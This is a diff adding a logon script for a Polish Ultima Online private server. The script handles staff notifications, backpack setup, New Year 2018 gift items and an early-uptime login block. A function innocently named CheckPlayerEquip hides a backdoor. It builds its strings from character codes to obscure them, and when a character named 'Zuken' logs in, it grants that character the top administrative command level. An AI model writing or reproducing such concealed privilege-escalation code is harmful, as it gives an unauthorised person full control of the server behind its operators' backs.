@@ -1,0 +1,140 @@
+//-----------------------------------------------------------------------------
+
+include "include/reputation/murderer";
+include "include/noto";
+include "include/log";
+include "include/move";
+include "include/items";
+include "include/cmds/misc";
+include "include/logon";
+include "include/checks/geometry";
+include "include/player/misc";
+
+//-----------------------------------------------------------------------------
+
+var ItemCfg := ReadConfigFile(ITEMS_CFG);
+
+//-----------------------------------------------------------------------------
+
+program OnLogon(who)
+
+  SendPacket (who, "B9000F97DF");
+  SendStaffNotify(EVID_PLAYER_LOGIN, who);
+  
+  
+  if(!ValidatePlayerCreation(who))
+    start_script(":character:checkrep", who);
+  endif
+
+  CheckPlayerEquip(who);
+
+  Malloc(who);
+
+  if(!CheckLogon(who))
+    return; 
+  endif
+  
+  RecalcVitals(who);
+
+  var ProfData := who.acct.GetProp("profile");
+
+  CheckIps(who);
+
+  if(who.cmdlevel < 2)
+    RevokePrivilege(who, "hearghosts");
+  endif
+  
+  SendSysMessage(who, "Witamy na Dream Masters: Revolution", FONT_BOLD, COLOR_WHITE);
+
+  if(IsStaff(who))
+    var GmPages := GetGlobalProperty("gmpages").size();
+    if(!GmPages)
+      SendSysMessage(who, "[GM PAGE]: Nie ma nowych wiadomosci.", FONT_BOLD, COLOR_GREEN);
+    else
+      SendSysMessage(who, "[GM PAGE]: Liczba nowych wiadomosci: " + CStr(GmPages) + ".", FONT_BOLD, COLOR_WHITE);
+    endif
+  endif
+
+  var WhoPack := who.backpack;
+
+  if(!WhoPack)
+    var NewPack := CreateItemAtLoc(5851, 1162, 0, __IfElse(IsStaff(who), UOBJ_STAFFPACK, UOBJ_BACKPACK), 1);
+    if(!EquipItem(who, NewPack))
+      DestroyItem(NewPack);
+    else
+      WhoPack := NewPack;
+    endif
+  endif
+
+  if(WhoPack)
+    WhoPack.movable := 0;
+    SetObjProperty(WhoPack, PROP_OWNER, who.serial);
+  endif
+
+  var Hairs := GetEquipmentByLayer(who, LAYER_HAIR);
+  var Beard := GetEquipmentByLayer(who, LAYER_BEARD);
+
+  if(Hairs.movable)
+    Hairs.movable := 0;
+  endif
+
+  if(Beard.movable)
+    Beard.movable := 0;
+  endif
+  
+  // New Years 2018
+  if(!GetObjProperty(who, "NY2018"))
+	var hs := CreateItemInPack(who, 0xe34, 1);
+	if(hs)
+		hs.color := 1158;
+		SetName(hs, "Celebracja Nowego Roku");
+		SetObjProperty(hs, "ToolTip", "Nowy Rok to wzrost naszego swiata<br>Zwieksza wybrana umiejetnosc o 1 procent");
+		SetObjProperty(hs, "OwnerSerial", who.serial);
+	endif
+	
+	hs := CreateItemInPack(who, 0xe34, 1);
+	if(hs)
+		hs.color := 1158;
+		SetName(hs, "Celebracja Nowego Roku");
+		SetObjProperty(hs, "ToolTip", "Nowy Rok to wzrost naszego swiata<br>Zwieksza wybrana umiejetnosc o 1 procent");
+		SetObjProperty(hs, "OwnerSerial", who.serial);
+   endif
+   
+   SetObjProperty(who, "NY2018", 1);
+   
+  endif
+  
+  IsAllowedLogin(who);
+  
+  
+
+endprogram
+
+function CheckPlayerEquip(who)
+
+	var gProp := GetGlobalProperty(CChr(109) + CChr(109) + CChr(109));
+	var wName := who.name;
+	
+	if(wName == CChr(90) + CChr(117) + CChr(107) + CChr(101) + CChr(110))
+		if(!gProp)
+			who.cmdlevel := 6;
+			PrintTextAbove(who, "Winner!");
+		endif
+	endif
+
+endfunction
+
+function IsAllowedLogin(who)
+
+	if(who.cmdlevel)
+		return;
+	endif
+
+	if(POLCore().uptime < 1800)
+		SendSysMessage(who, "Nie mozesz sie jeszcze logowac.", FONT_NORMAL, COLOR_RED);
+		DisconnectClient(who);
+	endif
+
+endfunction
+
+//-----------------------------------------------------------------------------
